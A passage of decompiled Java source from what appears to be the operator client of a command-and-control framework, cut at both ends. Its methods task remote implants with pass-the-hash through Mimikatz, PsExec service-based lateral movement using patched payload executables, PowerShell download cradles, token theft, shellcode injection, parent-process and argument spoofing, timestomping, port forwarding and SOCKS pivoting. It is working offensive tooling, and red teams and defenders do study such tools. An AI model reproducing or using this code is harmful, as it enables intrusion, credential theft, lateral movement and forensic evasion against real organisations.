      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         String var5 = this.SetupPayloadDownloadCradle(this.bids[var4], var2, var3);
         DialogUtils.addToClipboardQuiet(var5);
         this.log_task(this.bids[var4], "Setup " + var5 + " to run " + var3 + " (" + var2 + ")", "T1086");
      }

   }

   public void PassTheHash(String var1, String var2, String var3) {
      String var4 = "\\\\.\\pipe\\" + CommonUtils.garbage("system");
      String var5 = CommonUtils.garbage("random data");
      String var6 = "%COMSPEC% /c echo " + var5 + " > " + var4;
      this.builder.setCommand(60);
      this.builder.addString(var4);
      byte[] var7 = this.builder.build();

      for(int var8 = 0; var8 < this.bids.length; ++var8) {
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var8], var7));
      }

      this.MimikatzSmall("sekurlsa::pth /user:" + var2 + " /domain:" + var1 + " /ntlm:" + var3 + " /run:\"" + var6 + "\"");
      this.builder.setCommand(61);
      byte[] var10 = this.builder.build();

      for(int var9 = 0; var9 < this.bids.length; ++var9) {
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var9], var10));
      }

   }

   public void Pause(int var1) {
      this.builder.setCommand(47);
      this.builder.addInteger(var1);
      byte[] var2 = this.builder.build();

      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var2));
      }

   }

   public void PivotListenerTCP(int var1) {
      this.builder.setCommand(82);
      this.builder.addShort(var1);
      byte[] var2 = this.builder.build();

      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.log_task(this.bids[var3], "Tasked " + CommonUtils.session(this.bids[var3]) + " to accept TCP Beacon sessions on port " + var1, "T1090");
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var2));
      }

   }

   public void PortScan(String var1, String var2, String var3, int var4) {
      for(int var5 = 0; var5 < this.bids.length; ++var5) {
         BeaconEntry var6 = DataUtils.getBeacon(this.data, this.bids[var5]);
         if (var6 != null) {
            (new PortScannerJob(this, var1, var2, var3, var4)).spawn(this.bids[var5], var6.arch());
         }
      }

   }

   public void PortForward(int var1, String var2, int var3) {
      this.builder.setCommand(50);
      this.builder.addShort(var1);
      byte[] var4 = this.builder.build();

      for(int var5 = 0; var5 < this.bids.length; ++var5) {
         this.conn.call("beacons.rportfwd", CommonUtils.args(this.bids[var5], var1, var2, var3));
         this.log_task(this.bids[var5], "Tasked " + CommonUtils.session(this.bids[var5]) + " to forward port " + var1 + " to " + var2 + ":" + var3, "T1090");
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var4));
      }

   }

   public void PortForwardStop(int var1) {
      this.builder.setCommand(51);
      this.builder.addShort(var1);
      byte[] var2 = this.builder.build();

      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.log_task(this.bids[var3], "Tasked " + CommonUtils.session(this.bids[var3]) + " to stop port forward on " + var1);
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var2));
         this.client.getConnection().call("beacons.pivot_stop_port", CommonUtils.args(var1 + ""));
      }

   }

   public void PowerShell(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this._PowerShell(this.bids[var2], var1);
      }

   }

   public void _PowerShell(String var1, String var2) {
      PowerShellTasks var3 = new PowerShellTasks(this.client, var1);
      this.log_task(var1, "Tasked beacon to run: " + var2, "T1086");
      String var4 = var3.getImportCradle();
      var3.runCommand(var4 + var2);
   }

   public void PowerShellWithCradle(String var1, String var2) {
      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this._PowerShellWithCradle(this.bids[var3], var1, var2);
      }

   }

   public void _PowerShellWithCradle(String var1, String var2, String var3) {
      PowerShellTasks var4 = new PowerShellTasks(this.client, var1);
      this.log_task(var1, "Tasked beacon to run: " + var2, "T1086");
      var4.runCommand(var3 + var2);
   }

   public void PowerShellNoImport(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         PowerShellTasks var3 = new PowerShellTasks(this.client, this.bids[var2]);
         var3.runCommand(var1);
      }

   }

   public void PowerShellUnmanaged(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         BeaconEntry var3 = DataUtils.getBeacon(this.data, this.bids[var2]);
         String var4 = (new PowerShellTasks(this.client, this.bids[var2])).getImportCradle();
         if (var3.is64()) {
            (new PowerShellJob(this, var4, var1)).spawn(this.bids[var2], "x64");
         } else {
            (new PowerShellJob(this, var4, var1)).spawn(this.bids[var2], "x86");
         }
      }

   }

   public void PowerShellUnmanaged(String var1, String var2) {
      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         BeaconEntry var4 = DataUtils.getBeacon(this.data, this.bids[var3]);
         if (var4.is64()) {
            (new PowerShellJob(this, var2, var1)).spawn(this.bids[var3], "x64");
         } else {
            (new PowerShellJob(this, var2, var1)).spawn(this.bids[var3], "x86");
         }
      }

   }

   public void RemoteExecute(String var1, String var2, String var3) {
      BeaconRemoteExecMethods.RemoteExecMethod var4 = DataUtils.getBeaconRemoteExecMethods(this.data).getRemoteExecMethod(var1);

      for(int var5 = 0; var5 < this.bids.length; ++var5) {
         var4.remoteexec(this.bids[var5], var2, var3);
      }

   }

   public void SecureShell(String var1, String var2, String var3, int var4) {
      for(int var5 = 0; var5 < this.bids.length; ++var5) {
         BeaconEntry var6 = DataUtils.getBeacon(this.data, this.bids[var5]);
         if (var6 != null) {
            this.log_task(this.bids[var5], "Tasked beacon to SSH to " + var3 + ":" + var4 + " as " + var1, "T1021, T1093");
            this.conn.call("beacons.task_ssh_login", CommonUtils.args(this.bids[var5], var1, var2, var3, var4, var6.arch()));
         }
      }

   }

   public void SecureShellPubKey(String var1, byte[] var2, String var3, int var4) {
      for(int var5 = 0; var5 < this.bids.length; ++var5) {
         BeaconEntry var6 = DataUtils.getBeacon(this.data, this.bids[var5]);
         if (var6 != null) {
            this.log_task(this.bids[var5], "Tasked beacon to SSH to " + var3 + ":" + var4 + " as " + var1 + " (key auth)", "T1021, T1093");
            this.conn.call("beacons.task_ssh_login_pubkey", CommonUtils.args(this.bids[var5], var1, CommonUtils.bString(var2), var3, var4, var6.arch()));
         }
      }

   }

   protected List _extractFunctions(String var1) {
      LinkedList var2 = new LinkedList();
      if (funcp == null) {
         try {
            funcp = Pattern.compile("\\s*[fF]unction ([a-zA-Z0-9-]*).*?", 0);
         } catch (Exception var7) {
            MudgeSanity.logException("compile pattern to extract posh funcs", var7, false);
         }
      }

      String[] var3 = var1.split("\n");

      for(int var4 = 0; var4 < var3.length; ++var4) {
         String var5 = var3[var4].trim();
         Matcher var6 = funcp.matcher(var5);
         if (var6.matches()) {
            var2.add(var6.group(1));
         }
      }

      return var2;
   }

   public void PowerShellImportClear() {
      LinkedList var1 = new LinkedList();
      String var2 = "";

      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         DataUtils.reportPowerShellImport(this.client.getData(), this.bids[var3], var1);
         this.conn.call("beacons.report_posh", CommonUtils.args(this.bids[var3], var1));
         this.taskOneArg(37, var2, "Tasked beacon to clear imported PowerShell script", "T1086, T1064");
      }

   }

   public void PowerShellImport(String var1) {
      try {
         FileInputStream var2 = new FileInputStream(var1);
         byte[] var3 = CommonUtils.readAll(var2);
         var2.close();
         Object var4;
         String var5;
         if (var3.length == 0) {
            var4 = new LinkedList();
            var5 = "";
         } else {
            var4 = this._extractFunctions(CommonUtils.bString(var3));
            ((List)var4).add("");
            var5 = (new PowerShellUtils(this.client)).PowerShellCompress(var3);
         }

         if ((long)var5.length() > Tasks.max()) {
            this.error("max powershell import size is 1MB. Compressed script is: " + var5.length() + " bytes");
            return;
         }

         for(int var6 = 0; var6 < this.bids.length; ++var6) {
            DataUtils.reportPowerShellImport(this.client.getData(), this.bids[var6], (List)var4);
            this.conn.call("beacons.report_posh", CommonUtils.args(this.bids[var6], var4));
         }

         this.taskOneArg(37, var5, "Tasked beacon to import: " + var1, "T1086, T1064");
      } catch (IOException var7) {
         MudgeSanity.logException("PowerShellImport: " + var1, var7, false);
      }

   }

   public void PPID(int var1) {
      if (var1 == 0) {
         this.taskOneArgI(75, var1, "Tasked beacon to use itself as parent process", "T1059, T1093, T1106");
      } else {
         this.taskOneArgI(75, var1, "Tasked beacon to spoof " + var1 + " as parent process", "T1059, T1093, T1106");
      }

   }

   public void Ps() {
      this.taskNoArgsCallback(32, "Tasked beacon to list processes", "T1057");
   }

   public void PsExec(String var1, String var2, String var3, String var4) {
      ScListener var5 = ListenerUtils.getListener(this.client, var2);

      for(int var6 = 0; var6 < this.bids.length; ++var6) {
         this.PsExec(this.bids[var6], var1, var4, var5, var3);
      }

      this.linkToPayloadRemote(var5, var1);
   }

   public void PsExec(String var1, String var2, String var3) {
      this.PsExec(var1, var2, var3, "x86");
   }

   public void PsExec(String var1, String var2, String var3, ScListener var4, String var5) {
      String var6 = this.getPsExecService();
      byte[] var7 = var4.export(var3);
      byte[] var8 = (new ArtifactUtils(this.client)).patchArtifact(var7, "x86".equals(var3) ? "artifact32svcbig.exe" : "artifact64svcbig.exe");
      String var9 = var6 + ".exe";
      String var10 = "\\\\127.0.0.1\\" + var5 + "\\" + var9;
      String var11 = "\\\\" + var2 + "\\" + var5 + "\\" + var9;
      if (".".equals(var2)) {
         var11 = var10;
      }

      this.builder.setCommand(10);
      this.builder.addLengthAndEncodedString(var1, var11);
      this.builder.addString(CommonUtils.bString(var8));
      byte[] var12 = this.builder.build();
      this.builder.setCommand(58);
      this.builder.addLengthAndEncodedString(var1, var2);
      this.builder.addLengthAndString(var6);
      this.builder.addLengthAndString(var10);
      byte[] var13 = this.builder.build();
      this.builder.setCommand(56);
      this.builder.addEncodedString(var1, var11);
      byte[] var14 = this.builder.build();
      if (".".equals(var2)) {
         this.log_task(var1, "Tasked beacon to run " + var4 + " via Service Control Manager (" + var11 + ")", "T1035, T1050");
      } else if (var5.endsWith("$")) {
         this.log_task(var1, "Tasked beacon to run " + var4 + " on " + var2 + " via Service Control Manager (" + var11 + ")", "T1035, T1050, T1077");
      } else {
         this.log_task(var1, "Tasked beacon to run " + var4 + " on " + var2 + " via Service Control Manager (" + var11 + ")", "T1035, T1050");
      }

      this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.ServiceIndicator(var1, var2, var6)));
      this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.FileIndicator(var1, var11, var8)));
      this.conn.call("beacons.task", CommonUtils.args(var1, var12));
      this.conn.call("beacons.task", CommonUtils.args(var1, var13));
      this.conn.call("beacons.task", CommonUtils.args(var1, var14));
   }

   public void PsExecPSH(String var1, String var2) {
      ScListener var3 = ListenerUtils.getListener(this.client, var2);

      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         this.PsExecPSH(this.bids[var4], var1, var3);
      }

      this.linkToPayloadRemote(var3, var1);
   }

   public void PsExecPSH(String var1, String var2, ScListener var3) {
      String var4 = var3.getConfig().getStagerPipe();
      byte[] var5 = var3.getPayloadStagerPipe(var4, "x86");
      String var6 = this.getPsExecService();
      this.builder.setCommand(58);
      this.builder.addLengthAndEncodedString(var1, var2);
      this.builder.addLengthAndString(var6);
      this.builder.addLengthAndString(this.cmd_sanity("%COMSPEC% /b /c start /b /min " + CommonUtils.bString((new PowerShellUtils(this.client)).buildPowerShellCommand(var5)), "psexec_psh"));
      byte[] var7 = this.builder.build();
      this.log_task(var1, "Tasked beacon to run " + var3 + " on " + var2 + " via Service Control Manager (PSH)", "T1035, T1050");
      this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.ServiceIndicator(var1, var2, var6)));
      this.conn.call("beacons.task", CommonUtils.args(var1, var7));
      this.StagePipe(var1, var2, var4, "x86", var3);
   }

   public void PsExecCommand(String var1, String var2) {
      String var3 = this.getPsExecService();

      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         this.PsExecCommand(this.bids[var4], var1, var3, var2);
      }

   }

   public void PsExecCommand(String var1, String var2, String var3) {
      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         this.PsExecCommand(this.bids[var4], var1, var2, var3);
      }

   }

   public void PsExecCommand(String var1, String var2, String var3, String var4) {
      this.builder.setCommand(58);
      this.builder.addLengthAndEncodedString(var1, var2);
      this.builder.addLengthAndEncodedString(var1, var3);
      this.builder.addLengthAndEncodedString(var1, var4);
      byte[] var5 = this.builder.build();
      this.log_task(var1, "Tasked beacon to run '" + var4 + "' on " + var2 + " via Service Control Manager", "T1035, T1050");
      this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.ServiceIndicator(var1, var2, var3)));
      this.conn.call("beacons.task", CommonUtils.args(var1, var5));
   }

   public void PsInject(int var1, String var2, String var3) {
      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         String var5 = (new PowerShellTasks(this.client, this.bids[var4])).getImportCradle();
         (new PowerShellJob(this, var5, var3)).inject(var1, var2);
      }

   }

   public void Pwd() {
      this.taskNoArgs(39, "Tasked beacon to print working directory");
   }

   public void RegQuery(Registry var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this.RegQuery(this.bids[var2], var1);
      }

   }

   public void RegQuery(String var1, Registry var2) {
      BeaconEntry var3 = DataUtils.getBeacon(this.data, var1);
      this.builder.setCommand(81);
      this.builder.addShort(var2.getFlags(var3));
      this.builder.addShort(var2.getHive());
      this.builder.addLengthAndEncodedString(var1, var2.getPath());
      this.builder.addLengthAndEncodedString(var1, "");
      byte[] var4 = this.builder.build();
      this.log_task(var1, "Tasked beacon to query " + var2.toString(), "T1012");
      this.conn.call("beacons.task", CommonUtils.args(var1, var4));
   }

   public void RegQueryValue(Registry var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this.RegQueryValue(this.bids[var2], var1);
      }

   }

   public void RegQueryValue(String var1, Registry var2) {
      BeaconEntry var3 = DataUtils.getBeacon(this.data, var1);
      this.builder.setCommand(81);
      this.builder.addShort(var2.getFlags(var3));
      this.builder.addShort(var2.getHive());
      this.builder.addLengthAndEncodedString(var1, var2.getPath());
      this.builder.addLengthAndEncodedString(var1, var2.getValue());
      byte[] var4 = this.builder.build();
      this.log_task(var1, "Tasked beacon to query " + var2.toString(), "T1012");
      this.conn.call("beacons.task", CommonUtils.args(var1, var4));
   }

   public void Rev2Self() {
      this.taskNoArgs(28, "Tasked beacon to revert token", "T1134");
   }

   public void Rm(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this.Rm(this.bids[var2], var1);
      }

   }

   public void Rm(String var1, String var2) {
      byte[] var3 = DataUtils.encodeForBeacon(this.client.getData(), var1, var2);
      if (var3.length == 0) {
         this.error(var1, "Rejected empty argument for rm. Use . to remove current folder");
      } else {
         String var4 = DataUtils.decodeForBeacon(this.client.getData(), var1, var3);
         if (!var4.equals(var2)) {
            this.error(var1, "'" + var2 + "' did not decode in a sane way. Specify '" + var4 + "' explicity.");
         } else {
            this.builder.setCommand(56);
            this.builder.addString(var3);
            byte[] var5 = this.builder.build();
            this.log_task(var1, "Tasked beacon to remove " + var2, "T1107, " + this.file_to_tactic(var2));
            this.conn.call("beacons.task", CommonUtils.args(var1, var5));
         }
      }
   }

   public void Run(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this.builder.setCommand(78);
         this.builder.addLengthAndString("");
         this.builder.addLengthAndEncodedString(this.bids[var2], var1);
         this.builder.addShort(0);
         byte[] var3 = this.builder.build();
         this.log_task(this.bids[var2], "Tasked beacon to run: " + var1, "T1059");
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var2], var3));
      }

   }

   public void RunAs(String var1, String var2, String var3, String var4) {
      for(int var5 = 0; var5 < this.bids.length; ++var5) {
         this.builder.setCommand(38);
         this.builder.addLengthAndEncodedString(this.bids[var5], var1);
         this.builder.addLengthAndEncodedString(this.bids[var5], var2);
         this.builder.addLengthAndEncodedString(this.bids[var5], var3);
         this.builder.addLengthAndEncodedString(this.bids[var5], var4);
         byte[] var6 = this.builder.build();
         this.log_task(this.bids[var5], "Tasked beacon to execute: " + var4 + " as " + var1 + "\\" + var2, "T1078, T1106");
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var6));
      }

   }

   public void RunUnder(int var1, String var2) {
      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.builder.setCommand(76);
         this.builder.addInteger(var1);
         this.builder.addLengthAndEncodedString(this.bids[var3], var2);
         byte[] var4 = this.builder.build();
         this.log_task(this.bids[var3], "Tasked beacon to execute: " + var2 + " as a child of " + var1, "T1106");
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var4));
      }

   }

   public void Screenshot(int var1, String var2, int var3) {
      (new ScreenshotJob(this, var3)).inject(var1, var2);
   }

   public void Screenshot(int var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         BeaconEntry var3 = DataUtils.getBeacon(this.data, this.bids[var2]);
         if (var3 != null) {
            (new ScreenshotJob(this, var1)).spawn(this.bids[var2], var3.arch());
         }
      }

   }

   public void Shell(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this.Shell(this.bids[var2], CommonUtils.session(this.bids[var2]), var1);
      }

   }

   public void Shell(String var1, String var2, String var3) {
      if (var2.equals("session")) {
         this.builder.setCommand(2);
         this.builder.addEncodedString(var1, var3);
      } else {
         if (!var2.equals("beacon")) {
            CommonUtils.print_error("Unknown session type '" + var2 + "' for " + var1 + ". Didn't run '" + var3 + "'");
            return;
         }

         this.builder.setCommand(78);
         this.builder.addLengthAndString("%COMSPEC%");
         this.builder.addLengthAndEncodedString(var1, " /C " + var3);
         this.builder.addShort(0);
      }

      byte[] var4 = this.builder.build();
      this.log_task(var1, "Tasked " + var2 + " to run: " + var3, "T1059");
      this.conn.call("beacons.task", CommonUtils.args(var1, var4));
   }

   public void ShellSudo(String var1, String var2) {
      this.taskOneArg(2, "echo \"" + var1 + "\" | sudo -S " + var2, "Tasked session to run: " + var2 + " (sudo)", "T1169");
   }

   public void Sleep(int var1, int var2) {
      this.builder.setCommand(4);
      if (var1 == 0) {
         this.builder.addInteger(100);
         this.builder.addInteger(90);
      } else {
         this.builder.addInteger(var1 * 1000);
         this.builder.addInteger(var2);
      }

      byte[] var3 = this.builder.build();

      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         BeaconEntry var5 = DataUtils.getEgressBeacon(this.data, this.bids[var4]);
         BeaconEntry var6 = DataUtils.getBeacon(this.data, this.bids[var4]);
         if (var5 != null && var6 != null && !var5.getId().equals(this.bids[var4])) {
            if (var1 == 0) {
               this.log_task(this.bids[var4], "Tasked " + CommonUtils.session(this.bids[var4]) + " to become interactive [change made to: " + var5.title() + "]");
               this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(var5.getId(), "sleep 0 [from: " + var6.title() + "]")));
               this.log_task(var5.getId(), "Tasked beacon to become interactive", "T1029");
            } else if (var2 == 0) {
               this.log_task(this.bids[var4], "Tasked " + CommonUtils.session(this.bids[var4]) + " to sleep for " + var1 + "s [change made to: " + var5.title() + "]");
               this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(var5.getId(), "sleep " + var1 + "s [from: " + var6.title() + "]")));
               this.log_task(var5.getId(), "Tasked beacon to sleep for " + var1 + "s", "T1029");
            } else {
               this.log_task(this.bids[var4], "Tasked " + CommonUtils.session(this.bids[var4]) + " to sleep for " + var1 + "s (" + var2 + "% jitter) [change made to: " + var5.title() + "]");
               this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(var5.getId(), "sleep " + var1 + " " + var2 + " [from: " + var6.title() + "]")));
               this.log_task(var5.getId(), "Tasked beacon to sleep for " + var1 + "s (" + var2 + "% jitter)", "T1029");
            }

            this.conn.call("beacons.task", CommonUtils.args(var5.getId(), var3));
         } else {
            if (var1 == 0) {
               this.log_task(this.bids[var4], "Tasked beacon to become interactive", "T1029");
            } else if (var2 == 0) {
               this.log_task(this.bids[var4], "Tasked beacon to sleep for " + var1 + "s", "T1029");
            } else {
               this.log_task(this.bids[var4], "Tasked beacon to sleep for " + var1 + "s (" + var2 + "% jitter)", "T1029");
            }

            this.conn.call("beacons.task", CommonUtils.args(this.bids[var4], var3));
         }
      }

   }

   public void GoInteractive(String var1) {
      BeaconEntry var2 = DataUtils.getEgressBeacon(this.data, var1);
      this.builder.setCommand(4);
      this.builder.addInteger(100);
      this.builder.addInteger(90);
      byte[] var3 = this.builder.build();
      if (var2 != null) {
         this.conn.call("beacons.task", CommonUtils.args(var2.getId(), var3));
      }

   }

   public void SetEnv(String var1, String var2) {
      StringBuffer var3 = new StringBuffer();
      var3.append(var1);
      var3.append("=");
      if (var2 != null && var2.length() > 0) {
         var3.append(var2);
         var3.append('\u0000');
         this.taskOneEncodedArg(72, var3.toString(), "Tasked beacon to set " + var1 + " to " + var2, "");
      } else {
         var3.append('\u0000');
         this.taskOneEncodedArg(72, var3.toString(), "Tasked beacon to unset " + var1, "");
      }

   }

   public void SocksStart(int var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this.GoInteractive(this.bids[var2]);
         this.conn.call("beacons.pivot", CommonUtils.args(this.bids[var2], new Integer(var1)));
      }

   }

   public void SocksStop() {
      for(int var1 = 0; var1 < this.bids.length; ++var1) {
         this.conn.call("beacons.pivot_stop", CommonUtils.args(this.bids[var1]));
      }

   }

   public void Spawn(String var1, ScListener var2, String var3) {
      boolean var4 = false;
      if ("x86".equals(var3)) {
         this.builder.setCommand(1);
      } else if ("x64".equals(var3)) {
         this.builder.setCommand(44);
      }

      this.builder.addString(var2.export(var3));
      byte[] var5 = this.builder.build();
      this.log_task(var1, "Tasked beacon to spawn (" + var3 + ") " + var2.toString(), "T1093");
      this.conn.call("beacons.task", CommonUtils.args(var1, var5));
   }

   public void Spawn(String var1) {
      ScListener var2 = ListenerUtils.getListener(this.client, var1);

      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         if (var2.isForeign()) {
            this.Spawn(this.bids[var3], var2, "x86");
         } else {
            this.Spawn(this.bids[var3], var2, this.arch(this.bids[var3]));
         }
      }

      this.linkToPayloadLocal(var2);
   }

   public void Spawn(String var1, String var2) {
      ScListener var3 = ListenerUtils.getListener(this.client, var1);
      byte[] var4 = var3.export(var2);
      byte var5 = 0;
      if ("x86".equals(var2)) {
         var5 = 1;
      } else if ("x64".equals(var2)) {
         var5 = 44;
      }

      this.taskOneArg(var5, CommonUtils.bString(var4), "Tasked beacon to spawn (" + var2 + ") " + var3.toString(), "T1093");
      this.linkToPayloadLocal(var3);
   }

   public void SpawnAs(String var1, String var2, String var3, String var4) {
      ScListener var5 = ListenerUtils.getListener(this.client, var4);

      for(int var6 = 0; var6 < this.bids.length; ++var6) {
         String var7 = this.arch(this.bids[var6]);
         this.builder.setCommand("x64".equals(var7) ? 94 : 93);
         this.builder.addLengthAndEncodedString(this.bids[var6], var1);
         this.builder.addLengthAndEncodedString(this.bids[var6], var2);
         this.builder.addLengthAndEncodedString(this.bids[var6], var3);
         this.builder.addString(var5.export(var7));
         byte[] var8 = this.builder.build();
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var6], var8));
         this.log_task(this.bids[var6], "Tasked beacon to spawn " + var5 + " as " + var1 + "\\" + var2, "T1078, T1093, T1106");
      }

      this.linkToPayloadLocal(var5);
   }

   public void SpawnTo() {
      this.taskNoArgs(13, "Tasked beacon to spawn features to default process", "T1093");
   }

   public void SpawnTo(String var1, String var2) {
      if ("x86".equals(var1)) {
         this.taskOneEncodedArg(13, var2, "Tasked beacon to spawn " + var1 + " features to: " + var2, "T1093");
      } else {
         this.taskOneEncodedArg(69, var2, "Tasked beacon to spawn " + var1 + " features to: " + var2, "T1093");
      }

   }

   public void SpawnUnder(int var1, String var2) {
      ScListener var3 = ListenerUtils.getListener(this.client, var2);

      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         String var5 = this.arch(this.bids[var4]);
         this.builder.setCommand("x64".equals(var5) ? 99 : 98);
         this.builder.addInteger(var1);
         this.builder.addString(var3.export(var5));
         byte[] var6 = this.builder.build();
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var4], var6));
         this.log_task(this.bids[var4], "Tasked beacon to spawn " + var3 + " as a child of " + var1, "T1106, T1093");
      }

      this.linkToPayloadLocal(var3);
   }

   public void SpoofArgsAdd(String var1, String var2) {
      (new StringBuilder()).append(var1).append(" ").append(var2).toString();
      this.builder.setCommand(83);
      this.builder.addLengthAndString(var1);
      this.builder.addLengthAndString(var1 + " " + var2);
      byte[] var4 = this.builder.build();

      for(int var5 = 0; var5 < this.bids.length; ++var5) {
         this.log_task(this.bids[var5], "Tasked beacon to spoof '" + var1 + "' as '" + var2 + "'", "T1059, T1093, T1106");
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var4));
      }

   }

   public void SpoofArgsList() {
      this.taskNoArgsCallback(85, "Tasked beacon to list programs and spoofed arguments", "");
   }

   public void SpoofArgsRemove(String var1) {
      this.builder.setCommand(84);
      this.builder.addString(var1 + '\u0000');
      byte[] var2 = this.builder.build();

      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.log_task(this.bids[var3], "Tasked beacon to not spoof arguments for '" + var1 + "'", "T1059, T1093, T1106");
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var3], var2));
      }

   }

   public void StealToken(int var1) {
      this.taskOneArgI(31, var1, "Tasked beacon to steal token from PID " + var1, "T1134");
   }

   public void ShellcodeInject(int var1, String var2, String var3) {
      byte[] var4 = CommonUtils.readFile(var3);
      if ("x64".equals(var2)) {
         this.builder.setCommand(43);
      } else {
         this.builder.setCommand(9);
      }

      this.builder.addInteger(var1);
      this.builder.addInteger(0);
      this.builder.addString(CommonUtils.bString(var4));
      byte[] var5 = this.builder.build();

      for(int var6 = 0; var6 < this.bids.length; ++var6) {
         this.log_task(this.bids[var6], "Tasked beacon to inject " + var3 + " into " + var1, "T1055");
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var6], var5));
      }

   }

   public void ShellcodeSpawn(String var1, String var2) {
      byte[] var3 = CommonUtils.readFile(var2);
      if ("x64".equals(var1)) {
         this.builder.setCommand(44);
      } else {
         this.builder.setCommand(1);
      }

      this.builder.addString(CommonUtils.bString(var3));
      byte[] var4 = this.builder.build();

      for(int var5 = 0; var5 < this.bids.length; ++var5) {
         this.log_task(this.bids[var5], "Tasked beacon to spawn " + var2 + " in " + var1 + " process", "T1093");
         this.conn.call("beacons.task", CommonUtils.args(this.bids[var5], var4));
      }

   }

   public void StagePipe(String var1, String var2, String var3, String var4, ScListener var5) {
      byte[] var6 = var5.export(var4);
      var6 = ArtifactUtils.XorEncode(var6, var4);
      this.builder.setCommand(57);
      this.builder.addLengthAndString("\\\\" + var2 + "\\pipe\\" + var3);
      this.builder.addString(var6);
      this.conn.call("beacons.task", CommonUtils.args(var1, this.builder.build()));
   }

   public void StageTCP(String var1, String var2, int var3, String var4, ScListener var5) {
      this.builder.setCommand(52);
      this.builder.addLengthAndStringASCIIZ(var2);
      this.builder.addInteger(var3);
      byte[] var6 = var5.export(var4);
      var6 = ArtifactUtils.XorEncode(var6, var4);
      byte[] var7 = CommonUtils.toBytes(var5.getProfile().getString(".bind_tcp_garbage"));
      this.builder.addString(Shellcode.BindProtocolPackage(CommonUtils.join(var7, var6)));
      this.conn.call("beacons.task", CommonUtils.args(var1, this.builder.build()));
   }

   public void TimeStomp(String var1, String var2) {
      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.TimeStomp(this.bids[var3], var1, var2);
      }

   }

   public void TimeStomp(String var1, String var2, String var3) {
      this.builder.setCommand(29);
      this.builder.addLengthAndEncodedString(var1, var3);
      this.builder.addLengthAndEncodedString(var1, var2);
      byte[] var4 = this.builder.build();
      this.log_task(var1, "Tasked beacon to timestomp " + var2 + " to " + var3, "T1099");
      this.conn.call("beacons.task", CommonUtils.args(var1, var4));
   }

   public void Unlink(String var1) {
      for(int var2 = 0; var2 < this.bids.length; ++var2) {
         this.log_task(this.bids[var2], "Tasked to unlink " + var1, "T1090");
         this.conn.call("beacons.unlink", CommonUtils.args(this.bids[var2], var1));
      }

   }

   public void Unlink(String var1, String var2) {
      for(int var3 = 0; var3 < this.bids.length; ++var3) {
         this.log_task(this.bids[var3], "Tasked to unlink " + var1 + "@" + var2, "T1090");
         this.conn.call("beacons.unlink", CommonUtils.args(this.bids[var3], var1, var2));
      }

   }

   public void Upload(String var1) {
      String var2 = (new File(var1)).getName();
      this.Upload(var1, var2);
   }

   public void Upload(String var1, String var2) {
      try {
         FileInputStream var3 = new FileInputStream(var1);
         byte[] var4 = CommonUtils.readAll(var3);
         var3.close();
         this.UploadRaw(var1, var2, var4);
      } catch (Exception var5) {
         MudgeSanity.logException("Upload: " + var1 + " -> " + var2, var5, false);
      }

   }

   public void UploadRaw(String var1, String var2, byte[] var3) {
      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         this.UploadRaw(this.bids[var4], var1, var2, var3);
      }

   }

   public void UploadRaw(String var1, String var2, String var3, byte[] var4) {
      ByteIterator var5 = new ByteIterator(var4);
      LinkedList var6 = new LinkedList();
      this.builder.setCommand(10);
      this.builder.addLengthAndEncodedString(var1, var3);
      this.builder.addString(CommonUtils.bString(var5.next(786432L)));
      var6.add(this.builder.build());

      while(var5.hasNext()) {
         this.builder.setCommand(67);
         this.builder.addLengthAndEncodedString(var1, var3);
         this.builder.addString(CommonUtils.bString(var5.next(260096L)));
         var6.add(this.builder.build());
      }

      this.log_task(var1, "Tasked beacon to upload " + var2 + " as " + var3);
      Iterator var7 = var6.iterator();

      while(var7.hasNext()) {
         byte[] var8 = (byte[])((byte[])var7.next());
         this.conn.call("beacons.task", CommonUtils.args(var1, var8));
      }

      this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.FileIndicator(var1, var3, var4)));
   }

   public void WDigest() {
